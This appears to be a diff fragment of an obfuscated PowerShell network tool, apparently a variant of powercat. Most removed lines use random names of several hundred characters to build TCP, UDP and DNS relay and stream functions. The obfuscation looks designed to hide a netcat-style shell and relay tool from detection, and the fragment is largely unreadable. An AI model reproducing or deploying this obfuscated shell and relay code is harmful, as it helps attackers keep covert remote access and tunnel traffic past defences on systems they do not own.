-    $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_Close`n{`n" + ${function:NlhklqURSnRhOeNHSCLaHCKhtocAYilqqLHdtTSnU} + "`n}`n`n")    
-      if($l){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = "wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn @('',`$tRue,'$p','$t') "}
-         else{$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = "wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn @('$C',`$falSE,'$p','$t') "}
-     }
-   elseif($DNS -ne "")
-       {
-      $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf = ("function Stream1_Setup`n{`n" + ${function:hJyKpLLMqVKqYkuGxJIocwrjBEQdyuxyeXynSvZhr} + "`n}`n`n")
-     $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_ReadData`n{`n" + ${function:CUUxFbaetfSOccrIYLyPHSUXGmrnvjfDnJXSSZnj} + "`n}`n`n")
- $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_WriteData`n{`n" + ${function:dcwftShdwAZnCAYbBqppDaFVdDEzxrhxSiDMlNEsh} + "`n}`n`n")
-      $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_Close`n{`n" + ${function:oWFjjHKNfpJPseUnoIPINTXFDOltSrgdZCCwSBjTQ} + "`n}`n`n")
-  if($l){return "This feature is not available."}
-        else{$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = "wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn @('$C','$p','$DNS',$DNSfT) "}
+          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+        }
       }
-else
-    {
-        $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf = ("function Stream1_Setup`n{`n" + ${function:eHtUukBucTlaRsAyjVUlAlLlDheusNXGFBXdMjQR} + "`n}`n`n")
-  $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_ReadData`n{`n" + ${function:HrpeEDtRLbrezLnWzOGjBUsToLXzCFEzrgiKyDvJ} + "`n}`n`n")
-$UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_WriteData`n{`n" + ${function:WirpmKZbIevFCendtulqMCsUBEXReCYGGRlellDZ} + "`n}`n`n")
-    $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_Close`n{`n" + ${function:CKPikfPeoVhYiqjRUEDKidHEebqnvwdZdzpFcPMfO} + "`n}`n`n")
-    if($l){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = "wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn @('',`$tRue,$p,$t) "}
-  else{$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = "wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn @('$C',`$falSE,$p,$t) "}
     }
- 
-      if($e -ne "")
-       {
-$UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Setup`n{`n" + ${function:RjWmGHGdXOIxkGjEnfyGzoPfUjqYExBHKaocLZuD} + "`n}`n`n")
-     $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_ReadData`n{`n" + ${function:HfoazkQOoKsVubTCrEBcJRPOJBoJoSVAFPnmhfEN} + "`n}`n`n")
-        $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_WriteData`n{`n" + ${function:YLInAghYhVjnWTyUpWhDtpOfmgqJbvJzOgcvXzXM} + "`n}`n`n")
-      $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Close`n{`n" + ${function:fbFREAOeTdTJFbGltzCzvQzffgPLRVUzcdDoqpjAN} + "`n}`n`n")
-   $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += "@('$e')`n`n"
- }
-    elseif($EP)
-  {
-      $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += "`n`n"
-      }
-  elseif($R -ne "")
-       {
-       if($R.split(":")[0].ToLower() -eq "udp")
+    finally
     {
-        $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Setup`n{`n" + ${function:vZvkDCepcxXuhCllStMOJIMnxxFrjwmluLgCjjfi} + "`n}`n`n")
-     $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_ReadData`n{`n" + ${function:DjrISUCTNiuOuZGXaNunCfMEVKxPEpPgDmpMNnrTo} + "`n}`n`n")
-      $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_WriteData`n{`n" + ${function:FdfPueloIDkMVFofLwCVjvTrbXFUvYHFGtsqifkP} + "`n}`n`n")
-       $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Close`n{`n" + ${function:NlhklqURSnRhOeNHSCLaHCKhtocAYilqqLHdtTSnU} + "`n}`n`n")    
-      if($R.split(":").Count -eq 2){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('',`$tRue,'" + $R.split(":")[1] + "','$t') ")}
-      elseif($R.split(":").Count -eq 3){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('" + $R.split(":")[1] + "',`$falSE,'" + $R.split(":")[2] + "','$t') ")}
-else{return "Bad relay format."}
-       }
-if($R.split(":")[0].ToLower() -eq "dns")
-   {
-       $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Setup`n{`n" + ${function:hJyKpLLMqVKqYkuGxJIocwrjBEQdyuxyeXynSvZhr} + "`n}`n`n")
